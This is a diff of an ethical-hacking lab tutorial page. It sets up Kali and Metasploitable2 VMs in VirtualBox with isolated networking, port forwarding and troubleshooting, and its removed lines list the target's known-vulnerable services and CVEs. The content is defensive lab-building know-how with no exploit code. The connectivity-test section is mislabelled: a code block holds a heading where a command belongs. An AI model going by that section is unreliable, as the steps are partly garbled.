+<code class="language-bash"># From your host machine (Windows Terminal / Linux terminal)
+ssh kali@192.168.56.101
+
+# Or from VS Code: Remote SSH  ⟶ 192.168.56.101</code></pre>
+                    </div>
+                </div>
+
+                <div class="content">
+                    <h3>Dual-Adapter Configuration Reference</h3>
+                    <h4>What Is a Dual-Adapter Setup?</h4>
+                    <p>A dual-adapter setup means assigning two separate virtual network interface cards (NICs) to a
+                        single VM — each connected
+                        to a different network — so the VM can handle two different types of traffic simultaneously.</p>
+                    <p>For the most practical lab setup, Kali uses two adapters simultaneously:</p>
+                    <div class="card-image-output">
+                        <img src="images/dual-adapter-kali-lab-setup.webp"
+                            alt="set up ethical hacking lab virtualbox kali-linux metasploitable2">
+                    </div>
+                    <p class="sub"><strong class="subtitle">Prerequisites</strong></p>
+                    <p>Before starting, confirm the following are ready:</p>
+                    <div class="bg-color">
+                        <pre>
+[ ] VirtualBox installed (6.x or 7.x)
+[ ] Kali Linux VM imported and visible in VirtualBox Manager
+[ ] Metasploitable2 VM imported and visible
+[ ] HackLab NAT Network already created
+[ ] Both VMs are powered OFF
+</pre>
+                    </div>
+                    <p>Verify HackLab NAT Network exists:</p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash">VBoxManage natnetwork list</code></pre>
+                    </div>
+                    <p><strong>Expected output:</strong></p>
+                    <div class="bg-color">
+                        <pre>
+Name:        HackLab
+Network:     10.10.10.0/24
+Gateway:     10.10.10.1
+DHCP:        Yes
+Enabled:     Yes
+</pre>
+                    </div>
+                    <p>If HackLab doesn't exist yet, create it first:</p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash">VBoxManage natnetwork add \
+  --netname HackLab \
+  --network "10.10.10.0/24" \
+  --enable \
+  --dhcp on</code></pre>
+                    </div>
+                    <h4>PART 1 — Configure Kali Linux (Dual Adapter)</h4>
+                    <p class="sub"><strong class="subtitle">Step 1A — Set Adapter 1 ⟶ NAT Network (HackLab)</strong></p>
+                    <p><strong>GUI Method:</strong></p>
+                    <div class="list">
+                        <ol>
+                            <li>Open VirtualBox Manager</li>
+                            <li>Select Kali Linux ⟶ Click Settings</li>
+                            <li>Go to Network ⟶ Adapter 1</li>
+                            <li>Check Enable Network Adapter</li>
+                            <li>Set:</li>
+                            <div class="bg-color">
+                                <pre>
+Attached to: NAT Network
+Name:        HackLab
+</pre>
+                            </div>
+                            <li>Expand Advanced:</li>
+                            <div class="bg-color">
+                                <pre>
+Adapter Type: Intel PRO/1000 MT Desktop (recommended)
+Promiscuous Mode: Deny
+Cable Connected: checked
+</pre>
+                            </div>
+                            <li>Click OK</li>
+                        </ol>
+                    </div>
+                    <p><strong>CLI Method:</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>cmd</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Power off Kali first
+VBoxManage controlvm "Kali Linux" poweroff
+
+# Assign Adapter 1 to HackLab NAT Network
+VBoxManage modifyvm "Kali Linux" \
+  --nic1 natnetwork \
+  --nat-network1 "HackLab"
+</code></pre>
+                    </div>
+                </div>
+
+                <p class="sub"><strong class="subtitle">Step 1B — Set Adapter 2 ⟶ NAT (Internet)</strong></p>
+                <p><strong>GUI Method:</strong></p>
+                <div class="list">
+                    <ol>
+                        <li>Still in Kali Settings ⟶ Network ⟶ Adapter 2</li>
+                        <li>Check Enable Network Adapter</li>
+                        <li>Set:</li>
+                        <div class="bg-color">
+                            <pre>
+Attached to: NAT
+</pre>
+                        </div>
+                        <li>Expand Advanced:</li>
+                        <div class="bg-color">
+                            <pre>
+Adapter Type: Intel PRO/1000 MT Desktop
+Cable Connected: checked
+</pre>
+                        </div>
+                        <li>Click OK</li>
+                    </ol>
+                </div>
+                <p><strong>CLI Method:</strong></p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>cmd</p>
+                    </div>
+                    <pre>
+<code class="language-bash"># Assign Adapter 2 to plain NAT (internet)
+VBoxManage modifyvm "Kali Linux" \
+  --nic2 nat
+</code></pre>
+                </div>
+                <p class="sub"><strong class="subtitle">Step 1C — Verify Kali Adapter Assignment</strong></p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>cmd</p>
+                    </div>
+                    <pre>
+<code class="language-bash">VBoxManage showvminfo "Kali Linux" | grep -i "NIC"
+</code></pre>
+                </div>
+                <p><strong>Expected output:</strong></p>
+                <div class="bg-color">
+                    <pre>
+NIC 1: MAC: 080027XXXXXX, Attachment: NAT Network 'HackLab'
+NIC 2: MAC: 080027YYYYYY, Attachment: NAT
+NIC 3: disabled
+NIC 4: disabled
+</pre>
+                </div>
+                <p>NIC 1 = HackLab | NIC 2 = NAT | NIC 3–8 = disabled</p>
+
+                <h4>PART 2 — Configure Metasploitable2 (Single Adapter)</h4>
+                <p class="sub"><strong class="subtitle">Step 2A — Set Adapter 1 ⟶ NAT Network (HackLab) Only</strong>
+                </p>
+                <p><strong>GUI Method:</strong></p>
+                <div class="list">
+                    <ol>
+                        <li>Select Metasploitable2 ⟶ Click Settings</li>
+                        <li>Go to Network ⟶ Adapter 1</li>
+                        <li>Check Enable Network Adapter</li>
+                        <li>Set:</li>
+                        <div class="bg-color">
+                            <pre>
+Attached to: NAT Network
+Name:        HackLab
+</pre>
+                        </div>
+                        <li>Click OK</li>
+                        <li>Go to Adapter 2 ⟶ Uncheck Enable Network Adapter</li>
+                        <li>Repeat for Adapter 3 and 4 ⟶ all disabled</li>
+                    </ol>
+                </div>
+                <p><strong>CLI Method:</strong></p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>cmd</p>
+                    </div>
+                    <pre>
+<code class="language-bash"># Assign Adapter 1 to HackLab
+VBoxManage modifyvm "Metasploitable2" \
+  --nic1 natnetwork \
+  --nat-network1 "HackLab"
+
+# Disable all other adapters
+VBoxManage modifyvm "Metasploitable2" --nic2 none
+VBoxManage modifyvm "Metasploitable2" --nic3 none
+VBoxManage modifyvm "Metasploitable2" --nic4 none
+</code></pre>
+                </div>
+                <div class="pro-tips">
+                    <p><strong>⚠️ Critical:</strong> Never assign Metasploitable2 a NAT or Bridged adapter — it would
+                        expose a fully vulnerable VM to the internet or your
+                        real home network.
+                    </p>
+                </div>
+                <p class="sub"><strong class="subtitle">Step 2B — Verify Metasploitable2 Adapter Assignment</strong></p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>cmd</p>
+                    </div>
+                    <pre>
+<code class="language-bash">VBoxManage showvminfo "Metasploitable2" | grep -i "NIC"
+</code></pre>
+                </div>
+                <p><strong>Expected output:</strong></p>
+                <div class="bg-color">
+                    <pre>
+NIC 1:    MAC: 080027ZZZZZZ, Attachment: NAT Network 'HackLab'
+NIC 2:    disabled
+NIC 3:    disabled
+NIC 4:    disabled
+</pre>
+                </div>
+
+                <h4>PART 3 — Boot Both VMs and Verify Inside Kali</h4>
+                <p class="sub"><strong class="subtitle">Step 3A — Start Both VMs</strong></p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>cmd</p>
+                    </div>
+                    <pre>
+<code class="language-bash"># Start Metasploitable2 first (target should be ready)
+VBoxManage startvm "Metasploitable2" --type gui
+
+# Start Kali Linux
+VBoxManage startvm "Kali Linux" --type gui
+</code></pre>
+                </div>
+                <p class="sub"><strong class="subtitle">Step 3B — Verify Both Interfaces Active in Kali</strong></p>
+                <p>Log into Kali, open a terminal and run:</p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash">ip addr show
+</code></pre>
+                </div>
+                <p class="sub"><strong class="subtitle">Step 3C — Fix eth1 If No IP Assigned</strong></p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash"># Request IP via DHCP on eth1
+sudo dhclient eth1
+
+# Verify IP was assigned
+ip addr show eth1
+</code></pre>
+                </div>
+                <p class="sub"><strong class="subtitle">Step 3D — Make eth1 Persistent Across Reboots</strong></p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash"># Check existing connections
+sudo nmcli connection show
+
+# Set eth1 (Wired connection 2) to auto-connect with DHCP
+sudo nmcli connection modify "Wired connection 2" \
+ipv4.method auto \
+connection.autoconnect yes
+
+# Apply immediately
+sudo nmcli connection up "Wired connection 2"
+</code></pre>
+                </div>
+                <h4>PART 4 — Connectivity Verification Tests</h4>
+                <p>Run all four tests from inside Kali to confirm everything works:</p>
+                <p class="sub"><strong class="subtitle">Test 1 — Kali Can Reach Metasploitable2 (Lab
+                        Connectivity)</strong>
+                </p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash">ping -c 3 10.10.10.5
+</code></pre>
+                </div>
+                <p class="sub"><strong class="subtitle">Test 2 — Kali Has Internet Access (Tool Updates)</strong>
+                </p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash">ping -c 3 8.8.8.8
+</code></pre>
+                </div>
+                <p class="sub"><strong class="subtitle">Test 3 — DNS Resolution Works</strong>
+                </p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash">Test 4 — Metasploitable2 Has NO Internet (Isolation Check)
+</code></pre>
+                </div>
+                <p class="sub"><strong class="subtitle">Test 1 — Kali Can Reach Metasploitable2 (Lab
+                        Connectivity)</strong>
+                </p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash"># Run this inside Metasploitable2 terminal
+ping -c 3 8.8.8.8
+</code></pre>
+                </div>
+                <h4>PART 5 — Routing Table Verification</h4>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash">ip route show
+</code></pre>
+                </div>
+                <p>If default route is missing:</p>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash">sudo ip route add default via 10.0.2.2 dev eth1
+</code></pre>
+                </div>
+
+                <div class="table-container">
+                    <h4>Quick Troubleshooting</h4>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Symptom</th>
+                                <th>Cause</th>
+                                <th>Fix</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code class="code">eth1</code> has no IP after boot</td>
+                                <td>DHCP not triggered</td>
+                                <td><code class="code">sudo dhclient eth1</code></td>
+                            </tr>
+                            <tr>
+                                <td>Both <code class="code">eth0</code> and <code class="code">eth1</code> on 10.10.10.x
+                                </td>
+                                <td>NIC 2 set to NAT Network instead of NAT</td>
+                                <td>Set --nic2 nat (plain NAT)</td>
+                            </tr>
+                            <tr>
+                                <td>Can't ping Metasploitable</td>
+                                <td>Different NAT Network names</td>
+                                <td>Check both VMs use exact same name "HackLab"</td>
+                            </tr>
+                            <tr>
+                                <td>No internet from Kali</td>
+                                <td>Default route missing</td>
+                                <td><code class="code">sudo ip route add default via 10.0.2.2 dev eth1</code></td>
+                            </tr>
+                            <tr>
+                                <td>Metasploitable has internet</td>
+                                <td>Extra adapter enabled</td>
+                                <td>Disable NIC 2/3/4 on Metasploitable</td>
+                            </tr>
+                            <tr>
+                                <td><code class="code">eth0</code> and <code class="code">eth1</code> names reversed
+                                </td>
+                                <td>NIC boot order</td>
+                                <td>Use <code class="code">ip addr show</code> to confirm actual names</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                <hr>
+                <div class="content">
+                    <h3>Configuring Port Forwarding on NAT Network</h3>
+                    <p>Port Forwarding on NAT Network is a rule that redirects traffic from your host machine's port to
+                        a
+                        specific VM's port —
+                        allowing you to reach services running inside a VM from outside it.</p>
+                    <p><strong>Why It's Needed</strong></p>
+                    <p>In NAT/NAT Network mode, the VM is hidden behind the virtual router — the host and external
+                        machines
+                        can't directly
+                        reach the VM. Port forwarding punches a specific "door" through that router.
+                    </p>
+                    <div class="card-image-output">
+                        <img src="images/port-forwarding-on-nat-network.webp" alt="Port Forwarding on NAT Network"
+                            loading="lazy">
+                    </div>
+                    <h4>How It Works — Step by Step</h4>
+                    <div class="list">
+                        <ol>
+                            <li>You send traffic to Host IP + Host Port (e.g., 127.0.0.1:2222).</li>
+                            <li>VirtualBox NAT router intercepts that traffic.</li>
+                            <li>It forwards it to the VM's IP + VM Port (e.g., 10.0.2.15:22).</li>
+                            <li>The VM receives it as if you connected directly.</li>
+                            <li>Response travels back the same way — VM ⟶ Router ⟶ Host[<a
+                                    href="https://docs.oracle.com/en/virtualization/virtualbox/6.0/user/network_nat.html"
+                                    class="link">docs.oracle</a>].​</li>
+                        </ol>
+                    </div>
                     <div class="table-container">
-                        <p><strong>Pre-installed vulnerable services:</strong></p>
+                        <h4>Common Port Forwarding Examples</h4>
                         <table>
                             <thead>
                                 <tr>
                                     <th>Service</th>
-                                    <th>Port</th>
-                                    <th>Vulnerability</th>
+                                    <th>Protocol</th>
+                                    <th>Host Port</th>
+                                    <th>VM Port</th>
+                                    <th>Use Case</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td><strong>vsftpd 2.3.4</strong></td>
-                                    <td>21</td>
-                                    <td>Backdoor — CVE-2011-2523</td>
+                                    <td><strong>SSH</strong></td>
+                                    <td>TCP</td>
+                                    <td><code class="code">2222</code></td>
+                                    <td><code class="code">22</code></td>
+                                    <td>Remote terminal into VM</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Samba 3.x</strong></td>
-                                    <td>445</td>
-                                    <td>RCE — CVE-2007-2447</td>
+                                    <td><strong>HTTP</strong></td>
+                                    <td>TCP</td>
+                                    <td><code class="code">8080</code></td>
+                                    <td><code class="code">80</code></td>
+                                    <td>Access web server in VM</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>MySQL 5.0</strong></td>
-                                    <td>3306</td>
-                                    <td>No root password</td>
+                                    <td><strong>HTTPS</strong></td>
+                                    <td>TCP</td>
+                                    <td><code class="code">8443</code></td>
+                                    <td><code class="code">443</code></td>
+                                    <td>Secure web server in VM</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>UnrealIRCd</strong></td>
-                                    <td>6667</td>
-                                    <td>Backdoor</td>
+                                    <td><strong>RDP</strong></td>
+                                    <td>TCP</td>
+                                    <td><code class="code">3389</code></td>
+                                    <td><code class="code">3389</code></td>
+                                    <td>Remote Desktop to Windows VM</td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Apache Tomcat</strong></td>
-                                    <td>8180</td>
-                                    <td>Default credentials</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>DVWA</strong></td>
-                                    <td>80</td>
-                                    <td>Web app vulnerabilities</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Open bindshell</strong></td>
-                                    <td>1524</td>
-                                    <td>Literal open root shell</td>
+                                    <td><strong>MySQL</strong></td>
+                                    <td>TCP</td>
+                                    <td><code class="code">3306</code></td>
+                                    <td><code class="code">3306</code></td>
+                                    <td>Access database in VM</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
-                    <p class="sub"><strong class="subtitle">Why you need it:</strong></p>
-                    <p>This is your target machine — the system you legally attack and exploit. Without it, you have
-                        nothing to practice on. It
-                        replaces the need to hack real systems (which is illegal) with a safe, identical
-                        simulation.geeksforgeeks+1.
+                    <h4>How to Configure — GUI</h4>
+                    <div class="list">
+                        <ol>
+                            <li>Go to File ⟶ Preferences ⟶ Network</li>
+                            <li>Select your NAT Network (e.g., HackLab) ⟶ click Edit</li>
+                            <li>Click Port Forwarding</li>
+                            <li>Click + to add a rule:</li>
+                            <div class="bg-color">
+                                <pre>
+Name:       SSH-Kali
+Protocol:   TCP
+Host IP:    127.0.0.1
+Host Port:  2222
+Guest IP:   10.0.2.15      ← your VM's IP
+Guest Port: 22
+</pre>
+                            </div>
+                            <li>Click OK</li>
+                        </ol>
+                    </div>
+                    <h4>How to Configure — VBoxManage CLI</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Forward host port 2222 → Kali SSH (port 22)
+VBoxManage natnetwork modify \
+  --netname HackLab \
+  --port-forward-4 "KaliSSH:tcp:[]:2222:[10.10.10.4]:22"
+
+# Forward host port 8080 → Metasploitable HTTP (port 80)
+VBoxManage natnetwork modify \
+  --netname HackLab \
+  --port-forward-4 "MetasploitHTTP:tcp:[]:8080:[10.10.10.5]:80"
+
+# Then access from host:
+# ssh -p 2222 kali@127.0.0.1
+# http://127.0.0.1:8080
+</code></pre>
+                    </div>
+                    <p>Port forwarding gives you controlled access — only the ports you explicitly forward are
+                        reachable, making it safer for
+                        lab environments.[<a href="https://www.simplified.guide/virtualbox/port-forwarding"
+                            class="link">simplified</a>]
+                        ​</p>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Advanced: Multi-Subnet Lab with Virtual Router</h3>
+                    <p>For advanced practice simulating real enterprise networks with multiple network segments — add a
+                        third VM running
+                        pfSense or VyOS as a virtual router between subnets: [ <a
+                            href="https://arxiv.org/pdf/2307.02794.pdf" class="link">7</a>
+                        ]
                     </p>
-
-                    <div class="table-container">
-                        <p class="sub"><strong class="subtitle">One-Line Summary for Each File</strong></p>
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>File</th>
-                                    <th>One-line purpose</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td><strong>VirtualBox 7.x</strong></td>
-                                    <td>The engine that runs both virtual machines on your computer</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Extension Pack</strong></td>
-                                    <td>Unlocks USB 2.0/3.0, RDP, and advanced hardware features for VMs</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Kali Linux Image</strong></td>
-                                    <td>Your pre-built attacker machine with 600+ hacking tools ready to use</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Metasploitable2 ZIP</strong></td>
-                                    <td>Your legal, intentionally broken target server to practise real exploits on</td>
-                                </tr>
-                            </tbody>
-                        </table>
+                    <div class="card-image-output">
+                        <img src="images/advanced-multi-subnet-lab-with-virtual-router.webp"
+                            alt="Advanced: Multi-Subnet Lab with Virtual Router" loading="lazy">
                     </div>
+                    <p>This forces you to practice pivoting — compromising a machine in LAN1 to reach LAN2, which
+                        mirrors real penetration
+                        testing engagements.</p>
                 </div>
-
-                <div class="content">
-                    <h3>Step 1 — Install VirtualBox</h3>
-                    <h4>Windows</h4>
-                    <div class="list">
-                        <ol>
-                            <li>Run the downloaded VirtualBox-7.x.x-Win.exe.</li>
-                            <li>Click "Next" through all screens (defaults are fine).</li>
-                            <li>When prompted about network interfaces ⟶ click "Yes" (Briefly disconnects your internet
-                                for 5 seconds — normal).</li>
-                            <li>Click "Install" ⟶ "Finish".</li>
-                            <li>VirtualBox opens automatically.</li>
-                        </ol>
-                    </div>
-
-                    <h4>macOS</h4>
-                    <div class="list">
-                        <ol>
-                            <li>Open VirtualBox-7.x.x-macOS.dmge.</li>
-                            <li>Double-click VirtualBox.pkg ⟶ Follow installer.</li>
-                            <li>System Preferences ⟶ Privacy & Security ⟶
-                                Allow software from Oracle America (VirtualBox kernel extension).</li>
-                            <li>Click "Install" ⟶ "Finish".</li>
-                            <li>Reboot if prompted.</li>
-                        </ol>
-                    </div>
-
-                    <h4>Ubuntu/Debian Linux</h4>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash">sudo apt update
-sudo apt install -y wget gnupg
-
-wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc \
--O- | sudo gpg --dearmor -o /usr/share/keyrings/oracle-virtualbox.gpg
-
-echo "deb [arch=amd64 signed-by=/usr/share/keyrings/oracle-virtualbox.gpg] \
-https://download.virtualbox.org/virtualbox/debian \
-$(lsb_release -cs) contrib" \
-| sudo tee /etc/apt/sources.list.d/virtualbox.list
-
-sudo apt update
-sudo apt install -y virtualbox-7.0
-
-# Add your user to vboxusers group
-sudo usermod -aG vboxusers $USER
-newgrp vboxusers</code></pre>
-                    </div>
-
-                    <h4>Install VirtualBox Extension Pack (all platforms)</h4>
-                    <div class="list">
-                        <ol>
-                            <li>VirtualBox Manager ⟶ File ⟶ Tools ⟶ Extension Pack Manager
-                                (or: File ⟶ Preferences ⟶ Extensions on older versions).</li>
-                            <li>Click the green "+" button.</li>
-                            <li>Browse to downloaded Oracle_VirtualBox_Extension_Pack-7.x.x.vbox-extpack.</li>
-                            <li>Click "Open" ⟶ "Install" ⟶ Accept license ⟶ "OK"</li>
-                            <p>Extension Pack adds: USB 2.0/3.0, RDP, encryption support.</p>
-                        </ol>
-                    </div>
+                <h4>Choosing the Right Mode: Decision Tree</h4>
+                <div class="bg-color">
+                    <pre>
+Do your VMs need to communicate with each other?
+├── NO  → Use NAT (default) per VM
+└── YES → Does Kali need internet access?
+          ├── YES → Does Metasploitable need internet?
+          │         ├── NO  → NAT Network (Kali) + NAT Network (Metasploitable)
+          │         │         + extra NAT adapter on Kali only  [RECOMMENDED]
+          │         └── YES → NAT Network for all VMs
+          └── NO  → Maximum isolation needed?
+                    ├── YES → Internal Network + static IPs  [MOST SECURE]
+                    └── NO  → Host-Only (if you need host ↔ VM access too)
+</pre>
                 </div>
-
-                <div class="content">
-                    <h3>Step 2 — Import Kali Linux VM</h3>
-                    <p>Kali provides a pre-built VirtualBox image — no OS installation needed:</p>
-                    <h4>Extract and Import</h4>
-                    <div class="bg-color">
-                        <pre>
-1. Extract the downloaded Kali .7z file:
-   Windows: Use 7-Zip (free at 7-zip.org)
-   macOS:   Double-click ⟶ built-in extraction
-   Linux:   7z x kali-linux-2024.x-virtualbox-amd64.7z
-2. In VirtualBox ⟶ File ⟶ Import Appliance (Ctrl+I)
-3. Browse to the extracted .ova file
-4. Click "Next" ⟶ Review settings:
-   ┌─────────────────────────────────────────┐
-   │ Name   : Kali Linux                     │
-   │ RAM    : 2048 MB (change to 2048–4096)  │
-   │ CPUs   : 2                              │
-   │ Disk   : 80 GB (pre-configured)         │
-   └─────────────────────────────────────────┘
-5. Click "Finish" ⟶ Import takes 3–5 minutes</pre>
-                    </div>
-
-                    <h4>Configure Kali VM Settings (before first boot)</h4>
-                    <div class="bg-color">
-                        <pre>
-1. Select "Kali Linux" in VirtualBox ⟶ Click "Settings" (gear icon)
-2. System ⟶ Motherboard:
-    Base Memory: Set to 2048 MB minimum (4096 MB recommended)
-    Boot Order: Hard Disk first 
-3. System ⟶ Processor:
-    Processors: 2 CPUs
-    Enable PAE/NX
-4. Display ⟶ Screen:
-    Video Memory: 128 MB
-    Graphics Controller: VMSVGA
-    Enable 3D Acceleration: (optional)
-5. Network ⟶ Adapter 1:
-    Leave as NAT for now — we configure Host-Only in Step 4
-6. Click "OK"</pre>
-                    </div>
-
-                    <h4>First Boot — Kali Login</h4>
-                    <div class="bg-color">
-                        <pre>
-1. Select Kali Linux ⟶ Click "Start" (green arrow)
-2. Wait for GNOME desktop to load (~60 seconds first boot)
-    Default credentials:
-    Username: kali
-    Password: kali
-3. Open Terminal (right-click desktop ⟶ "Open Terminal" OR
-use the terminal icon in the taskbar)
-4. Update Kali immediately</pre>
-                    </div>
-                    <div id="language-bash" class="code-block">
-                        <div class="title">
-                            <p>Bash</p>
-                        </div>
-                        <pre>
-<code class="language-bash"># Inside Kali VM terminal
-sudo apt update && sudo apt full-upgrade -y
-# This takes 10–20 minutes — do it once, never skip it
-
-# Reboot after upgrade
-sudo reboot</code></pre>
-                    </div>
+                <div class="table-container">
+                    <h4>Troubleshooting Network Issues</h4>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Symptom</th>
+                                <th>Likely Cause</th>
+                                <th>Fix</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>VMs can't ping each other</td>
+                                <td>Both on default NAT (not NAT Network)</td>
+                                <td>Switch both to same NAT Network — not plain NAT</td>
+                            </tr>
+                            <tr>
+                                <td>Metasploitable has no IP</td>
+                                <td>DHCP not reaching it</td>
+                                <td>Run <code class="code">sudo dhclient eth0</code> inside Metasploitable; verify NAT
+                                    Network DHCP is on
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>Kali has no internet after adding HackLab</td>
+                                <td>Only one adapter configured</td>
+                                <td>Add Adapter 2 as plain NAT for internet</td>
+                            </tr>
+                            <tr>
+                                <td>Ping works but Nmap shows host down</td>
+                                <td>ICMP blocked or VM firewall</td>
+                                <td>Run <code class="code">nmap -Pn 10.10.10.5</code> to skip ping check</td>
+                            </tr>
+                            <tr>
+                                <td>Host can't SSH into VM</td>
+                                <td>Host-Only not configured</td>
+                                <td>Add Host-Only adapter to VM; check vboxnet0 IP</td>
+                            </tr>
+                            <tr>
+                                <td>Two VMs on Internal Network can't communicate</td>
+                                <td>Different internal network names</td>
+                                <td>Both must use the exact same Internal Network name (case-sensitive)</td>
+                            </tr>
+                            <tr>
+                                <td>Bridged VM not getting LAN IP</td>
+                                <td>Physical adapter not selected</td>
+                                <td>In Bridged settings, pick your actual Wi-Fi/Ethernet adapter, not "All adapters"
+                                </td>
+                            </tr>
+                            <tr>
+                                <td><code class="code">eth1</code> not appearing in Kali after adding Adapter 2</td>
+                                <td>NetworkManager needs refresh</td>
+                                <td>Run <code class="code">sudo nmcli networking off && sudo nmcli networking on</code>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
                 </div>
-
-                <div class="content">
-                    <h3>Step 3 — Import Metasploitable2</h3>
-                    <p>Metasploitable2 is an intentionally vulnerable Ubuntu server built by Rapid7 specifically for
-                        practising exploits.</p>
-                    <div class="bg-color">
-                        <pre>
-Default login: msfadmin / msfadmin
-
-Vulnerabilities included:
-  - vsftpd 2.3.4 (FTP backdoor)
-  - UnrealIRCd 3.2.8.1 (IRC backdoor)
-  - Samba 3.x (usermap_script)
-  - Apache Tomcat (default credentials)
-  - MySQL (root with no password)
-  - DVWA (Damn Vulnerable Web App)
-  - Mutillidae (web app vulnerabilities)
-  - 20+ more services intentionally misconfigured</pre>
-                    </div>
-
-                    <h4>Import the VMDK</h4>
-                    <div class="bg-color">
-                        <pre>
-1. Extract Metasploitable2-Linux.zip ⟶ you get a folder with .vmdk file
-2. VirtualBox ⟶ Machine ⟶ New (Ctrl+N)
-3. Configure the new VM:
-   ┌──────────────────────────────────────────────────────┐
-   │ Name            : Metasploitable2                    │
-   │ Machine Folder  : (default or your preferred path)   │
-   │ Type            : Linux                              │
-   │ Version         : Ubuntu (64-bit)                    │
-   └──────────────────────────────────────────────────────┘
-   Click "Next"
-4. Memory:
-   RAM: 1024 MB (1 GB is enough — it's a server, no GUI)
-   Click "Next"
-5. Hard Disk:
-   Select "Use an existing virtual hard disk file"
-   Click the folder icon ⟶ "Add"
-   Browse to Metasploitable2-Linux/Metasploitable.vmdk
-   Select it ⟶ "Choose" ⟶ "Create"
-6. VM is created. Now configure settings:
-   Select Metasploitable2 ⟶ Settings
-   System ⟶ Motherboard:
-     Base Memory: 1024 MB
-     Boot Order: Hard Disk  (uncheck Floppy, Optical)
-   Network ⟶ Adapter 1:
-      Leave as NAT for now — configure in Step 4
-   Audio: Disable (server doesn't need it)
-   Click "OK"</pre>
-                    </div>
+                <h4>Security Checklist for Your Network Config</h4>
+                <div class="list">
+                    <ul>
+                        <li>Metasploitable is on NAT Network or Internal Network only — never Bridged.</li>
+                        <li>No Metasploitable adapter is set to Bridged or Host-Only (which exposes it to host).</li>
+                        <li>VirtualBox DHCP is serving 10.x.x.x or 192.168.x.x — not overlapping your real LAN.</li>
+                        <li>Kali's internet adapter is Adapter 2 (NAT) — not Bridged.</li>
+                        <li>After each session, use VirtualBox → Machine → Pause or take a snapshot before closing [ <a
+                                href="https://www.youtube.com/watch?v=2PCnypO--J0&vl=en" class="link">9</a> ].
+                        </li>
+                    </ul>
                 </div>
+                <hr>
+                <h3>VBoxManage CLI Cheat Sheet</h3>
+                <div id="language-bash" class="code-block">
+                    <div class="title">
+                        <p>bash</p>
+                    </div>
+                    <pre>
+<code class="language-bash"># List all VMs
+VBoxManage list vms
 
-                <div class="content">
-                    <h3>Step 4 — Configure Host-Only Network (Isolated Lab)</h3>
-                    <p>This is the most important step. A Host-Only network creates a private subnet that:</p>
+# List all NAT Networks
+VBoxManage natnetwork list
+
+# List all Host-Only networks
+VBoxManage list hostonlyifs
+
+# Show VM network config
+VBoxManage showvminfo "Kali Linux" | grep -i nic
+
+# Start VM headless (no GUI window)
+VBoxManage startvm "Kali Linux" --type headless
+
+# Start VM with GUI
+VBoxManage startvm "Kali Linux" --type gui
+
+# Power off VM
+VBoxManage controlvm "Kali Linux" poweroff
+
+# Take a snapshot
+VBoxManage snapshot "Kali Linux" take "Clean State" --description "Fresh lab"
+
+# Restore snapshot
+VBoxManage snapshot "Kali Linux" restore "Clean State"
+</code></pre>
+                </div>
+                <div class="upcoming">
+                    <h3>Upcoming</h3>
+                    <h4>Advanced: Multi-Subnet Lab with Virtual Router</h4>
                     <div class="list">
                         <ul>
-                            <li>Allows Kali and Metasploitable2 to talk to each othe.</li>
-                            <li>Blocks both VMs from reaching the real internet.</li>
-                            <li>Blocks internet from reaching your VMs.</li>
+                            <li>Build a Real Enterprise Network Simulation in VirtualBox</li>
+                            <li><strong>Series:</strong> Ethical Hacking Lab Setup · Advanced Lab Topology</li>
